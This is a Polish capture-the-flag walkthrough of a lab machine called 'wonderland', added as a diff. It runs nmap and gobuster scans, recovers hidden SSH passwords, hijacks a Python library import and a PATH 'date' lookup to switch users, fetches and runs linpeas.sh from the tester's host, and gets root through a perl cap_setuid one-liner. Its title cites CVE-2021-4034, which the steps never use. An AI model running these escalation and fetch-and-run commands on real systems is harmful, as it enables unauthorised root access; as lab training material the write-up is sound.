@@ -1,0 +1,232 @@
+Exploit CVE-2021-4034.
+
+*Enumeracja za pomoca nmap:*
+```python
+sudo nmap -sS -sV 10.10.255.63
+sudo nmap -sC -sV -A -O -Pn 10.10.255.63
+
+Nmap scan report for 10.10.255.63
+Host is up (0.047s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap wykazał 2 otwarte porty:
+22/tcp open  ssh 
+80/tcp open  http
+```
+
+Port ssh wymaga poświadczeń, których nie posiadam, więc w tym
+momencie będę enumerował port 80.
+
+*W tym celu w przeglądarce wpisuję:*
+```python
+http://10.10.255.63:80
+```
+Nie znalazłem czegoś ciekawego na stronie.
+
+*W tym momencie dokonuję enumeracji katalogu w celu wyszukania ukrytych
+katalogów na serwerze www:*
+```python
+gobuster dir -u http://10.10.255.63 --wordlist /usr/share/wordlists/dirb/common.txt
+
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.255.63
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Timeout:                 10s
+===============================================================
+2022/09/19 04:06:31 Starting gobuster in directory enumeration mode
+===============================================================
+/img                  (Status: 301) [Size: 0] [--> img/]
+/index.html           (Status: 301) [Size: 0] [--> ./]  
+/r                    (Status: 301) [Size: 0] [--> r/]  
+                                                        
+===============================================================
+2022/09/19 04:06:57 Finished
+===============================================================
+```
+
+*Teraz sprawdzam wyniki narzedzia gobuster:*
+```python
+http://10.10.255.63/img
+http://10.10.255.63/index.html
+http://10.10.255.63/r
+
+http://10.10.255.63/img/white_rabbit_1.jpg
+```
+
+*Pobranie obrazu na Kali Linux:*
+```python
+wget http://10.10.255.63/img/white_rabbit_1.jpg
+```
+
+
+*Wpisałem równiez inny adres strony:*
+```python
+http://10.10.255.63/r/a/b/b/i/t
+```
+
+*Pobranie obrazu na Kali Linux:*
+```python
+wget http://10.10.255.63/r/a/b/b/i/t
+```
+
+*Po sprawdzeniu pliku okazało się ze jego treść zawiera poświadczenia:*
+<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
+
+login: alice
+password: HowDothTheLittleCrocodileImproveHisShiningTail
+
+*Logowanie przez ssh:*
+```python
+ssh alice@10.10.255.63
+pwd
+ls -al
+```
+
+*Szukam flagi użytkownika:*
+```python
+ls -al /root/user.txt
+cat /root/user.txt
+```
+
+
+W katalogu /home znajdują się inni użytkownicy.
+Na tą chwilę mam dostęp do użytkownika alice.
+
+*W katalogi alice znajduje sie skrypt pythona:*
+walrus_and_the_carpenter.py
+
+*Sprawdzenie jakie pliki można uruchomić za pomocą polecenia sudo -l:*
+```python
+sudo -l
+
+atching Defaults entries for alice on wonderland:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alice may run the following commands on wonderland:
+    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+```
+
+Okazało się iż mogę uruchomić plik walrus_and_the_carpenter.py
+jako użytkownik królik.
+
+To, co skrypt zasadniczo robi, to wybieranie 10 losowych linijek z wiersza i wyprowadza je na ekranie.
+
+*Sprawdzanie w jakich lokalizacjach zostały zapisane biblioteki:*
+```python
+python3 -c 'import sys; print (sys.path)'
+```
+
+biblioteka znajduje się w /usr/lib/python3.6
+
+*Importowanie własnej biblioteki:*
+```python
+cd /home/alice/
+alice@wonderland:~$ nano random.py
+import os
+os.system("/bin/bash")
+
+sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
+```
+
+
+*Jako użytkownik królik:*
+```python
+cd /home/rabbit
+```
+
+*Plik binarny teaParty posiada bit suid:*
+-rwsr-sr-x 1 root   root   16816 May 25  2020 teaParty
+
+
+*Pobranie pliku teaParty.
+Target:*
+```python
+python3 -m http.server
+```
+
+*Kali Linux:*
+```python
+wget http://10.10.255.63:8000/teaParty
+```
+
+Plik wykonywalny wyświetli fałszywy komunikat o błędzie segmentacji. 
+Jest uruchamiany jako root i ma ustawiony bit SUID. 
+Manipuluje funkcją, aby odzwierciedlić bieżącą datę godziny + 1 godzinę. 
+Można próbować to wykorzystać, podłączając funkcję date.
+
+*Target:*
+```python
+nano date 
+
+#!/bin/bash
+/bin/bash
+ 
+chmod +x date
+export PATH=/home/rabbit:$PATH
+./teaParty
+
+whoami
+cd /home/hatter/
+cat password.txt 
+WhyIsARavenLikeAWritingDesk?
+```
+
+*Logowanie do SSH*
+```python
+ssh hatter@10.10.255.63
+password: WhyIsARavenLikeAWritingDesk?
+```
+
+*Sprawdzanie przywilejów:*
+```python
+sudo -l
+```
+
+Niestety przywilejów brak.
+Sorry, user hatter may not run sudo on wonderland.
+
+*Pobieranie linpeas.sh na target:*
+```python
+wget http://10.18.105.140:8000/linpeas.sh
+
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+Został znaleziony exploit CVE-2021-4034.
+
+Interesujące rzeczy dotyczą Perla:
+
+[+] Capabilities
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#capabilities
+/usr/bin/perl5.26.1 = cap_setuid+ep
+/usr/bin/mtr-packet = cap_net_raw+ep
+/usr/bin/perl = cap_setuid+ep
+
+*Wejscie na strone:*
+```python
+https://gtfobins.github.io/gtfobins/perl/
+```
+
+*Target:*
+```python
+/usr/bin/perl5.26.1 -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+```
+
+**Zdobycie roota !!!**
+
+```python
+whoami
+cat /home/alice/root.txt
+```
